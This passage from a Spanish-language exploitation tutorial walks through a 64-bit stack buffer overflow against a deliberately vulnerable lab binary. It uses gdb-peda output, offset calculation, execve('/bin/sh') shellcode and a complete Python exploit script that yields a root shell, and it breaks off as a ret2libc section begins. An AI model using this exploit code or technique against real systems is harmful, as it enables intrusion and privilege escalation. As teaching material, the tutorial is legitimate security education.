<code><span class="s2">❯ ./example </span><span class="k">$(</span><span class="s2">python2 </span><span class="p">exploit.py</span><span class="k">)</span><span class="p">
# whoami
root
#</span>
</code></pre></div></div><br>

<div><strong><h3>Explotación (64 bits)</h3></strong></div><br>

<div><p>La explotación de el Buffer Overflow básico en 64 bits es casi exactamente igual a 31 bits solo cambian los nombres de los registros y la longitud de las direcciones</p></div>
<div><p>Al compilarlo quitaremos el -m32 para que lo haga en x64, el programa funciona igual que antes</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ gcc </span><span class="p">example.c -z execstack -fno-stack-protector -no-pie -o example</span><span class="p">
example.c: In function ‘main’:
example.c:4:5: </span><span class="k">warning:</span><span class="p"> implicit declaration [</span><span class="k">-Wimplicit-function-declaration</span><span class="p">]
    4 |     </span><span class="k">copier</span><span class="p">(argv[1]);
      |     </span><span class="k">^~~~~~</span><span class="p">

</span><span class="s2">❯ ls</span><span class="p">
 example   example.c

</span><span class="s2">❯ ./example </span><span class="p">test
Buffer Overflow!</span>
</code></pre></div></div><br>

<div><p>Como usamos los mismos parametros que antes es x64 pero aún sin protecciones</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ checksec </span><span class="p">example
[</span><span class="na">*</span><span class="p">] '/root/example'
    Arch:     amd64-64-little
    RELRO:    </span><span class="no">Partial RELRO</span><span class="p">
    Stack:    </span><span class="kd">No canary found</span><span class="p">
    NX:       </span><span class="kd">NX disabled</span><span class="p">
    PIE:      </span><span class="kd">No PIE (0x400000)</span><span class="p">
    RWX:      </span><span class="kd">Has RWX segments</span>
</code></pre></div></div><br>

<div><p>Igual que antes crearemos un argumento de un patron especialmente diseñado con gdb-peda y correremos el programa para que se corrompa y muestre los valores</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ gdb </span><span class="p">-q ./example
Reading symbols from </span><span class="s2">./example</span><span class="p">...
(No debugging symbols found in </span><span class="s2">./example</span><span class="p">)
</span><span class="kd">gdb-peda$</span><span class="p"> pattern_arg 200
Set 1 arguments to program
</span><span class="kd">gdb-peda$</span><span class="p"> run
Starting program: </span><span class="s2">./example </span><span class="p">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
[Thread debugging using libthread_db enabled]
Using host libthread_db library "</span><span class="s2">/lib/x86_64-linux-gnu/libthread_db.so.1</span><span class="p">".

Program received signal SIGSEGV, Segmentation fault.

</span><span class="na">[----------------------------------registers-----------------------------------]</span><span class="p">
</span><span class="s2">RAX</span><span class="p">:</span><span class="na"> 0x7fffffffe410 </span><span class="p">("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
</span><span class="s2">RBX</span><span class="p">:</span><span class="na"> 0x7fffffffe5c8 </span><span class="p">--> </span><span class="na">0x7fffffffe8e4 </span><span class="p">("./example")
</span><span class="s2">RCX</span><span class="p">: 0x0 
</span><span class="s2">RDX</span><span class="p">:</span><span class="na"> 0x7fffffffe4d8 </span><span class="p">--></span><span class="na"> 0x7fffffffe500 </span><span class="p">--> </span><span class="s2">0x403e00</span><span class="p"> --> </span><span class="kd">0x401100 </span><span class="p">(&lt__do_global_dtors_aux>:	endbr64)
</span><span class="s2">RSI</span><span class="p">:</span><span class="na"> 0x7fffffffe9d0 </span><span class="p">("TH_SOCK=/tmp/ssh-XXXXXXW79ynz/agent.1390")
</span><span class="s2">RDI</span><span class="p">:</span><span class="na"> 0x7fffffffe410 </span><span class="p">("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
</span><span class="s2">RBP</span><span class="p">: 0x6c41415041416b41 ('AkAAPAAl')
</span><span class="s2">RSP</span><span class="p">:</span><span class="na"> 0x7fffffffe498 </span><span class="p">("AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
</span><span class="s2">RIP</span><span class="p">:</span><span class="kd"> 0x401199 </span><span class="p">(&ltcopier+42>:	ret)
</span><span class="s2">R8 </span><span class="p">: 0xfefefefefefefeff 
</span><span class="s2">R9 </span><span class="p">: 0xffffffffffff0000 
</span><span class="s2">R10</span><span class="p">:</span><span class="s2"> 0x7ffff7dd2240 </span><span class="p">--> 0x10001a00004298 
</span><span class="s2">R11</span><span class="p">:</span><span class="kd"> 0x7ffff7e72440 </span><span class="p">&lt__strcpy_sse2>:	mov    rcx,rsi)
</span><span class="s2">R12</span><span class="p">: 0x0 
</span><span class="s2">R13</span><span class="p">:</span><span class="na"> 0x7fffffffe5e0 </span><span class="p">--> </span><span class="na">0x7fffffffe9ca </span><span class="p">("SSH_AUTH_SOCK=/tmp/ssh-XXXXXXW79ynz/agent.1390")
</span><span class="s2">R14</span><span class="p">:</span><span class="kd"> 0x403e00</span><span class="p"> --></span><span class="s2"> 0x401100 </span><span class="p">(&lt__do_global_dtors_aux>:	endbr64)
</span><span class="s2">R15</span><span class="p">:</span><span class="na"> 0x7ffff7ffd020 </span><span class="p">--></span><span class="na"> 0x7ffff7ffe2e0 </span><span class="p">--> 0x0
</span><span class="s2">EFLAGS</span><span class="p">: 0x10246 (</span><span class="s2">carry </span><span class="kd">PARITY </span><span class="s2">adjust </span><span class="kd">ZERO </span><span class="s2">sign trap </span><span class="kd">INTERRUPT </span><span class="s2">direction overflow</span><span class="p">)
</span><span class="na">[-------------------------------------code-------------------------------------]
   0x401192 &ltcopier+35>:	</span><span class="kd">call   0x401030 &ltstrcpy@plt></span><span class="p">
   0x401197 &ltcopier+40>:	</span><span class="c1">nop</span><span class="p">
   0x401198 &ltcopier+41>:	</span><span class="c1">leave  </span><span class="p">
=> 0x401199 &ltcopier+42>:	</span><span class="s2">ret    </span><span class="p">
   0x40119a:	add    BYTE PTR [rax],al
   0x40119c &lt_fini>:	sub    rsp,0x8
   0x4011a0 &lt_fini+4>:	add    rsp,0x8
   0x4011a4 &lt_fini+8>:	</span><span class="na">ret
[------------------------------------stack-------------------------------------]</span><span class="p">
0000| </span><span class="na">0x7fffffffe498</span><span class="p"> ("AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0008| </span><span class="na">0x7fffffffe4a0</span><span class="p"> ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0016| </span><span class="na">0x7fffffffe4a8</span><span class="p"> ("ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0024| </span><span class="na">0x7fffffffe4b0</span><span class="p"> ("AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0032| </span><span class="na">0x7fffffffe4b8</span><span class="p"> ("VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0040| </span><span class="na">0x7fffffffe4c0</span><span class="p"> ("AuAAXAAvAAYAAwAAZAAxAAyA")
0048| </span><span class="na">0x7fffffffe4c8</span><span class="p"> ("AAYAAwAAZAAxAAyA")
0056| </span><span class="na">0x7fffffffe4d0</span><span class="p"> ("ZAAxAAyA")</span><span class="na">
[------------------------------------------------------------------------------]</span><span class="p">
Legend: </span><span class="kd">code</span><span class="p">,</span><span class="na"> data</span><span class="p">,</span><span class="s2"> rodata</span><span class="p">, value
Stopped reason: </span><span class="kd">SIGSEGV</span><span class="p">
</span><span class="na">0x0000000000401199 </span><span class="p">in </span><span class="no">copier</span><span class="p"> ()
</span><span class="kd">gdb-peda$</span>
</code></pre></div></div><br>

<div><p>Buscamos la direccion de rsp y calculamos el offset, esa es la cantidad de bytes antes de llegar a RIP</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="kd">gdb-peda$</span><span class="p"> x/wx $rsp
</span><span class="na">0x7fffffffe498</span><span class="p">:	0x41514141
</span><span class="kd">gdb-peda$</span><span class="p"> pattern_offset 0x41514141
1095844161 found at offset: </span><span class="na">136
</span><span class="kd">gdb-peda$</span>
</code></pre></div></div><br>

<div><p>Igual que antes empezamos a crear el script en python, iniciamos por definir el offset que es 136</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python2
</span><span class="p">
offset </span><span class="kd">=</span><span class="na"> 136</span>
</code></pre></div></div><br>

<div><p>Agregamos un <a href="https://www.exploit-db.com/exploits/43550">shellcode</a> que nos ejecute '/bin/sh' pero en este caso que corra en 64 bits</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python2
</span><span class="p">
offset </span><span class="kd">=</span><span class="na"> 136</span><span class="p">

shellcode </span><span class="kd"> = </span><span class="k">b</span><span class="s2">""</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x6a\x3b\x58\x99\x52\x48\xbb\x2f"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x2f\x62\x69\x6e\x2f\x73\x68\x53"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x54\x5f\x52\x57\x54\x5e\x0f\x05"</span>
</code></pre></div></div><br>

<div><p>Igual que hicimos antes el junk sera '\x90' por el offset menos la longitud del shellcode, para que no sobrepase los 136 bytes que se necesitan para llegar a RIP sin sobreescribirlo</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python2
</span><span class="p">
offset </span><span class="kd">=</span><span class="na"> 136</span><span class="p">

shellcode </span><span class="kd"> = </span><span class="k">b</span><span class="s2">""</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x6a\x3b\x58\x99\x52\x48\xbb\x2f"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x2f\x62\x69\x6e\x2f\x73\x68\x53"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x54\x5f\x52\x57\x54\x5e\x0f\x05"</span><span class="p">

junk </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"\x90" </span><span class="kd">*</span><span class="p"> (offset </span><span class="kd">-</span><span class="k"> len</span><span class="p">(shellcode))</span>
</code></pre></div></div><br>

<div><p>Finalmente rellenamos RIP con 4 B por ahora paradebuguear y lo printeamos</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python2
</span><span class="p">
offset </span><span class="kd">=</span><span class="na"> 136</span><span class="p">

shellcode </span><span class="kd"> = </span><span class="k">b</span><span class="s2">""</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x6a\x3b\x58\x99\x52\x48\xbb\x2f"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x2f\x62\x69\x6e\x2f\x73\x68\x53"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x54\x5f\x52\x57\x54\x5e\x0f\x05"</span><span class="p">

junk </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"\x90" </span><span class="kd">*</span><span class="p"> (offset </span><span class="kd">-</span><span class="k"> len</span><span class="p">(shellcode))

rip </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"B"</span><span class="kd"> *</span><span class="na"> 6

</span><span class="k">print</span><span class="p">(junk </span><span class="kd">+ </span><span class="p">shellcode</span><span class="kd"> +</span><span class="p"> rip)</span>
</code></pre></div></div><br>

<div><p>Corremos de nuevo gdb con el binario con el exploit ejecutado como argumento</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ gdb </span><span class="p">-q ./example
Reading symbols from </span><span class="s2">./example</span><span class="p">...
(No debugging symbols found in </span><span class="s2">./example</span><span class="p">)
</span><span class="kd">gdb-peda$ </span><span class="p">run $(python2 exploit.py)
Starting program: </span><span class="s2">./example </span><span class="p">$(python2 exploit.py)
[Thread debugging using libthread_db enabled]
Using host libthread_db library "</span><span class="s2">/lib/x86_64-linux-gnu/libthread_db.so.1</span><span class="p">".

Program received signal SIGSEGV, Segmentation fault.
</span><span class="na">
[----------------------------------registers-----------------------------------]
</span><span class="s2">RAX</span><span class="p">: </span><span class="na">0x7fffffffe450 </span><span class="p">--> 0x9090909090909090 
</span><span class="s2">RBX</span><span class="p">: </span><span class="na">0x7fffffffe608 </span><span class="na">--> </span><span class="na">0x7fffffffe920 </span><span class="p">("./example")
</span><span class="s2">RCX</span><span class="p">: 0x0 
</span><span class="s2">RDX</span><span class="p">: </span><span class="s2">0x7fffffffe4dc</span><span class="p"> --> 0xffffe60800000000 
</span><span class="s2">RSI</span><span class="p">: </span><span class="s2">0x7fffffffe9d0</span><span class="p"> ("TH_SOCK=/tmp/ssh-XXXXXXW79ynz/agent.1390")
</span><span class="s2">RDI</span><span class="p">: </span><span class="s2">0x7fffffffe450</span><span class="p"> --> 0x9090909090909090 
</span><span class="s2">RBP</span><span class="p">: 0x50f5e5457525f54 
</span><span class="s2">RSP</span><span class="p">: </span><span class="na">0x7fffffffe4e0 </span><span class="p">--> </span><span class="na">0x7fffffffe608 </span><span class="p">--></span><span class="na"> 0x7fffffffe920</span><span class="p"> ("./example")
</span><span class="s2">RIP</span><span class="p">: 0x424242424242 ('BBBBBB')
</span><span class="s2">R8 </span><span class="p">: 0xfefefefefefefeff 
</span><span class="s2">R9 </span><span class="p">: 0xffffffffffff0000 
</span><span class="s2">R10</span><span class="p">: </span><span class="s2">0x7ffff7dd2240 </span><span class="p">--> 0x10001a00004298 
</span><span class="s2">R11</span><span class="p">:</span><span class="kd"> 0x7ffff7e72440 </span><span class="p">(&lt__strcpy_sse2>:	mov    rcx,rsi)
</span><span class="s2">R12</span><span class="p">: 0x0 
</span><span class="s2">R13</span><span class="p">: </span><span class="na">0x7fffffffe620 </span><span class="p">--></span><span class="na"> 0x7fffffffe9ca </span><span class="p">("SSH_AUTH_SOCK=/tmp/ssh-XXXXXXW79ynz/agent.1390")
</span><span class="s2">R14</span><span class="p">: </span><span class="s2">0x403e00 </span><span class="p">--></span><span class="kd"> 0x401100 </span><span class="p">(&lt__do_global_dtors_aux>:	endbr64)
</span><span class="s2">R15</span><span class="p">: </span><span class="na">0x7ffff7ffd020 </span><span class="p">--> </span><span class="na">0x7ffff7ffe2e0 </span><span class="p">--> 0x0
</span><span class="s2">EFLAGS</span><span class="p">: 0x10246 (</span><span class="s2">carry </span><span class="kd">PARITY </span><span class="s2">adjust </span><span class="kd">ZERO </span><span class="s2">sign trap </span><span class="kd">INTERRUPT </span><span class="s2">direction overflow</span><span class="p">)
</span><span class="na">[-------------------------------------code-------------------------------------]
</span><span class="kd">Invalid $PC address: 0x42424242
</span><span class="na">[------------------------------------stack-------------------------------------]</span><span class="p">
0000| </span><span class="na">0x7fffffffe4e0 </span><span class="p">--> </span><span class="na">0x7fffffffe608 </span><span class="p">--> </span><span class="na">0x7fffffffe920 </span><span class="p">("./example")
0008| </span><span class="na">0x7fffffffe4e8 </span><span class="p">--> 0x200000000 
0016| </span><span class="na">0x7fffffffe4f0 </span><span class="p">--> 0x2 
0024| </span><span class="na">0x7fffffffe4f8 </span><span class="p">--> </span><span class="kd">0x7ffff7df018a </span><span class="p">(&lt__libc_start_call_main+122>:	mov    edi,eax)
0032| </span><span class="na">0x7fffffffe500 </span><span class="p">--> 0x0 
0040| </span><span class="na">0x7fffffffe508 </span><span class="p">--> </span><span class="kd">0x401136 </span><span class="p">(&ltmain>:	push   rbp)
0048| </span><span class="na">0x7fffffffe510 </span><span class="p">--> 0x200000000 
0056| </span><span class="na">0x7fffffffe518 </span><span class="p">--> </span><span class="na">0x7fffffffe608 </span><span class="p">--> </span><span class="na">0x7fffffffe920 </span><span class="p">("./example")
</span><span class="na">[------------------------------------------------------------------------------]
</span><span class="p">Legend:</span><span class="kd"> code</span><span class="p">,</span><span class="na"> data</span><span class="p">,</span><span class="s2"> rodata</span><span class="p">, value
Stopped reason: </span><span class="kd">SIGSEGV</span><span class="p">
</span><span class="na">0x0000424242424242 </span><span class="p">in </span><span class="no">??</span><span class="p"> ()
</span><span class="kd">gdb-peda$</span>
</code></pre></div></div><br>

<div><p>Leemos de la pila y buscamos una linea intermedia que solo tenga nops para apuntar ahi</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="kd">gdb-peda$ </span><span class="p">x/350wx $rsp
</span><span class="na">0x7fffffffe4e0</span><span class="p">:	0xffffe608	0x00007fff	0x00000000	0x00000002
</span><span class="na">0x7fffffffe4f0</span><span class="p">:	0x00000002	0x00000000	0xf7df018a	0x00007fff
</span><span class="na">0x7fffffffe500</span><span class="p">:	0x00000000	0x00000000	0x00401136	0x00000000
</span><span class="na">0x7fffffffe510</span><span class="p">:	0x00000000	0x00000002	0xffffe608	0x00007fff
</span><span class="na">0x7fffffffe520</span><span class="p">:	0xffffe608	0x00007fff	0xc96987fc	0x5f1ff3a6
</span><span class="na">0x7fffffffe530</span><span class="p">:	0x00000000	0x00000000	0xffffe620	0x00007fff
</span><span class="na">0x7fffffffe540</span><span class="p">:	0x00403e00	0x00000000	0xf7ffd020	0x00007fff
</span><span class="na">0x7fffffffe550</span><span class="p">:	0x036d87fc	0xa0e00c59	0xcbe987fc	0xa0e01c18
</span><span class="na">0x7fffffffe560</span><span class="p">:	0x00000000	0x00000000	0x00000000	0x00000000
</span><span class="na">0x7fffffffe570</span><span class="p">:	0x00000000	0x00000000	0x00000000	0x00000000
</span><span class="na">0x7fffffffe580</span><span class="p">:	0xffffe608	0x00007fff	0x3facff00	0x1a884853
</span><span class="na">0x7fffffffe590</span><span class="p">:	0x0000000d	0x00000000	0xf7df0245	0x00007fff
</span><span class="na">0x7fffffffe5a0</span><span class="p">:	0x00401136	0x00000000	0x00403e00	0x00000000
</span><span class="na">0x7fffffffe5b0</span><span class="p">:	0x00000000	0x00000000	0x00000000	0x00000000
</span><span class="na">0x7fffffffe5c0</span><span class="p">:	0x00000000	0x00000000	0x00401050	0x00000000
</span><span class="na">0x7fffffffe5d0</span><span class="p">:	0xffffe600	0x00007fff	0x00000000	0x00000000
</span><span class="na">0x7fffffffe5e0</span><span class="p">:	0x00000000	0x00000000	0x00401071	0x00000000
</span><span class="na">0x7fffffffe5f0</span><span class="p">:	0xffffe5f8	0x00007fff	0x00000038	0x00000000
</span><span class="na">0x7fffffffe600</span><span class="p">:	0x00000002	0x00000000	0xffffe920	0x00007fff
</span><span class="na">0x7fffffffe610</span><span class="p">:	0xffffe93d	0x00007fff	0x00000000	0x00000000
</span><span class="na">0x7fffffffe620</span><span class="p">:	0xffffe9ca	0x00007fff	0xffffe9f9	0x00007fff
</span><span class="na">0x7fffffffe630</span><span class="p">:	0xffffea4f	0x00007fff	0xffffea62	0x00007fff
</span><span class="na">0x7fffffffe640</span><span class="p">:	0xffffea73	0x00007fff	0xffffea89	0x00007fff
</span><span class="na">0x7fffffffe650</span><span class="p">:	0xffffeaa4	0x00007fff	0xffffead4	0x00007fff
</span><span class="na">0x7fffffffe660</span><span class="p">:	0xffffeaed	0x00007fff	0xffffeb21	0x00007fff
</span><span class="na">0x7fffffffe670</span><span class="p">:	0xffffeb37	0x00007fff	0xffffeb41	0x00007fff
</span><span class="na">0x7fffffffe680</span><span class="p">:	0xffffeb5d	0x00007fff	0xffffeb97	0x00007fff
</span><span class="na">0x7fffffffe690</span><span class="p">:	0xffffeba7	0x00007fff	0xffffebca	0x00007fff
</span><span class="na">0x7fffffffe6a0</span><span class="p">:	0xffffec00	0x00007fff	0xffffec0b	0x00007fff
</span><span class="na">0x7fffffffe6b0</span><span class="p">:	0xffffec1a	0x00007fff	0xffffec39	0x00007fff
</span><span class="na">0x7fffffffe6c0</span><span class="p">:	0xffffec55	0x00007fff	0xffffec66	0x00007fff
</span><span class="na">0x7fffffffe6d0</span><span class="p">:	0xffffec80	0x00007fff	0xffffec93	0x00007fff
</span><span class="na">0x7fffffffe6e0</span><span class="p">:	0xffffecb1	0x00007fff	0xffffece5	0x00007fff
</span><span class="na">0x7fffffffe6f0</span><span class="p">:	0xffffed03	0x00007fff	0xffffedf9	0x00007fff
</span><span class="na">0x7fffffffe700</span><span class="p">:	0xffffee18	0x00007fff	0xffffee29	0x00007fff
</span><span class="na">0x7fffffffe710</span><span class="p">:	0xffffee47	0x00007fff	0xffffee5c	0x00007fff
</span><span class="na">0x7fffffffe720</span><span class="p">:	0xffffee6f	0x00007fff	0xffffeeb2	0x00007fff
</span><span class="na">0x7fffffffe730</span><span class="p">:	0xffffeed1	0x00007fff	0xffffeeec	0x00007fff
</span><span class="na">0x7fffffffe740</span><span class="p">:	0xffffeef9	0x00007fff	0xffffef1b	0x00007fff
</span><span class="na">0x7fffffffe750</span><span class="p">:	0xffffef2f	0x00007fff	0xffffef46	0x00007fff
</span><span class="na">0x7fffffffe760</span><span class="p">:	0xffffef5a	0x00007fff	0xffffef6b	0x00007fff
</span><span class="na">0x7fffffffe770</span><span class="p">:	0xffffef76	0x00007fff	0xffffef7e	0x00007fff
</span><span class="na">0x7fffffffe780</span><span class="p">:	0xffffef8a	0x00007fff	0xffffef9e	0x00007fff
</span><span class="na">0x7fffffffe790</span><span class="p">:	0xffffefbc	0x00007fff	0xffffefc6	0x00007fff
</span><span class="na">0x7fffffffe7a0</span><span class="p">:	0xffffefcf	0x00007fff	0x00000000	0x00000000
</span><span class="na">0x7fffffffe7b0</span><span class="p">:	0x00000021	0x00000000	0xf7fc9000	0x00007fff
</span><span class="na">0x7fffffffe7c0</span><span class="p">:	0x00000033	0x00000000	0x000006f0	0x00000000
</span><span class="na">0x7fffffffe7d0</span><span class="p">:	0x00000010	0x00000000	0x078bfbff	0x00000000
</span><span class="na">0x7fffffffe7e0</span><span class="p">:	0x00000006	0x00000000	0x00001000	0x00000000
</span><span class="na">0x7fffffffe7f0</span><span class="p">:	0x00000011	0x00000000	0x00000064	0x00000000
</span><span class="na">0x7fffffffe800</span><span class="p">:	0x00000003	0x00000000	0x00400040	0x00000000
</span><span class="na">0x7fffffffe810</span><span class="p">:	0x00000004	0x00000000	0x00000038	0x00000000
</span><span class="na">0x7fffffffe820</span><span class="p">:	0x00000005	0x00000000	0x0000000d	0x00000000
</span><span class="na">0x7fffffffe830</span><span class="p">:	0x00000007	0x00000000	0xf7fcb000	0x00007fff
</span><span class="na">0x7fffffffe840</span><span class="p">:	0x00000008	0x00000000	0x00000000	0x00000000
</span><span class="na">0x7fffffffe850</span><span class="p">:	0x00000009	0x00000000	0x00401050	0x00000000
</span><span class="na">0x7fffffffe860</span><span class="p">:	0x0000000b	0x00000000	0x000003e8	0x00000000
</span><span class="na">0x7fffffffe870</span><span class="p">:	0x0000000c	0x00000000	0x000003e8	0x00000000
</span><span class="na">0x7fffffffe880</span><span class="p">:	0x0000000d	0x00000000	0x000003e8	0x00000000
</span><span class="na">0x7fffffffe890</span><span class="p">:	0x0000000e	0x00000000	0x000003e8	0x00000000
</span><span class="na">0x7fffffffe8a0</span><span class="p">:	0x00000017	0x00000000	0x00000000	0x00000000
</span><span class="na">0x7fffffffe8b0</span><span class="p">:	0x00000019	0x00000000	0xffffe909	0x00007fff
</span><span class="na">0x7fffffffe8c0</span><span class="p">:	0x0000001a	0x00000000	0x00000002	0x00000000
</span><span class="na">0x7fffffffe8d0</span><span class="p">:	0x0000001f	0x00000000	0xffffefdb	0x00007fff
</span><span class="na">0x7fffffffe8e0</span><span class="p">:	0x0000000f	0x00000000	0xffffe919	0x00007fff
</span><span class="na">0x7fffffffe8f0</span><span class="p">:	0x00000000	0x00000000	0x00000000	0x00000000
</span><span class="na">0x7fffffffe900</span><span class="p">:	0x00000000	0x00000000	0xacff3300	0x8848533f
</span><span class="na">0x7fffffffe910</span><span class="p">:	0xd364b61a	0xfe2f8ff9	0x363878c3	0x0034365f
</span><span class="na">0x7fffffffe920</span><span class="p">:	0x6d6f682f	0x616b2f65	0x442f696c	0x61637365
</span><span class="na">0x7fffffffe930</span><span class="p">:	0x73616772	0x6178652f	0x656c706d	0x90909000
</span><span class="na">0x7fffffffe940</span><span class="p">:	0x90909090	0x90909090	0x90909090	0x90909090
</span><span class="na">0x7fffffffe950</span><span class="p">:	0x90909090	0x90909090	0x90909090	0x90909090
</span><span class="na">0x7fffffffe960</span><span class="p">:	0x90909090	0x90909090	0x90909090	0x90909090
</span><span class="na">0x7fffffffe970</span><span class="p">:	0x90909090	0x90909090	0x90909090	0x90909090
</span><span class="na">0x7fffffffe980</span><span class="p">:	0x90909090	0x90909090	0x90909090	0x90909090
</span><span class="na">0x7fffffffe990</span><span class="p">:	0x90909090	0x90909090	0x90909090	0x90909090
</span><span class="na">0x7fffffffe9a0</span><span class="p">:	0x90909090	0x90909090	0x90909090	0x583b6a90
</span><span class="na">0x7fffffffe9b0</span><span class="p">:	0xbb485299	0x69622f2f	0x68732f6e	0x525f5453
</span><span class="na">0x7fffffffe9c0</span><span class="p">:	0x0f5e5457	0x42424205	0x53530042	0x55415f48
</span><span class="na">0x7fffffffe9d0</span><span class="p">:	0x535f4854	0x3d4b434f	0x706d742f	0x6873732f
</span><span class="na">0x7fffffffe9e0</span><span class="p">:	0x5858582d	0x57585858	0x6e793937	0x67612f7a
</span><span class="na">0x7fffffffe9f0</span><span class="p">:	0x2e746e65	0x30393331	0x4f4e4700	0x545f454d
</span><span class="na">0x7fffffffea00</span><span class="p">:	0x494d5245	0x5f4c414e	0x45524353	0x2f3d4e45
</span><span class="na">0x7fffffffea10</span><span class="p">:	0x2f67726f	0x6d6f6e67	0x65542f65	0x6e696d72
</span><span class="na">0x7fffffffea20</span><span class="p">:	0x732f6c61	0x65657263	0x31362f6e	0x65633434
</span><span class="na">0x7fffffffea30</span><span class="p">:	0x315f6334	0x5f666137	0x62326634	0x3135625f
</span><span class="na">0x7fffffffea40</span><span class="p">:	0x30305f33	0x34636431	0x31666561	0x53006465
</span><span class="na">0x7fffffffea50</span><span class="p">:	0x415f4853	0x544e4547</span>
</code></pre></div></div><br>

<div><p>Nos quedamos con uno que en los 4 campos solo tenga nops (0x90909090)</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="na">0x7fffffffe970</span><span class="p">:	0x90909090	0x90909090	0x90909090	0x90909090</span>
</code></pre></div></div><br>

<div><p>Ya que estamos en little endian tendremos que darle la vuelta a la dirección de la siguiente forma</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="na">0x7fffffffe970</span><span class="p">  -->  </span><span class="na">\x7f\xff\xff\xff\xe9\x70</span><span class="p">  -->  </span><span class="na">\x70\xe9\xff\xff\xff\x7f</span>
</code></pre></div></div><br>

<div><p>Finalmente nuestro script deberia quedar de una forma como la siguiente</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python2

</span><span class="p">offset </span><span class="kd">=</span><span class="na"> 136</span><span class="p">

shellcode  </span><span class="kd">=</span><span class="k"> b</span><span class="s2">""</span><span class="p">
shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x6a\x3b\x58\x99\x52\x48\xbb\x2f"</span><span class="p">
shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x2f\x62\x69\x6e\x2f\x73\x68\x53"</span><span class="p">
shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x54\x5f\x52\x57\x54\x5e\x0f\x05"</span><span class="p">

junk </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"\x90"</span><span class="kd"> *</span><span class="p"> (offset</span><span class="kd"> -</span><span class="k"> len</span><span class="p">(shellcode))

rip </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"\x70\xe9\xff\xff\xff\x7f"</span><span class="p">

</span><span class="k">print</span><span class="p">(junk</span><span class="kd"> +</span><span class="p"> shellcode</span><span class="kd"> +</span><span class="p"> rip)</span>
</code></pre></div></div><br>

<div><p>Al ejecutar el programa con el script corriendo como argumento nos deberia otorgar una sh</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ ./example </span><span class="k">$(</span><span class="s2">python2 </span><span class="p">exploit.py</span><span class="k">)</span><span class="p">
# whoami
root
#</span>
</code></pre></div></div>
<div><p>Como se puede notar es la misma explotación que x86 solo cambian detalles minimos</p></div><br>

<div><strong><h3>Bypass NX Enabled (ret2libc)</h3></strong></div><br>

<div><p>Compilaremos el codigo de nuevo de nuevo en x86 pero quitando -z execstack para habilitar el NX</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
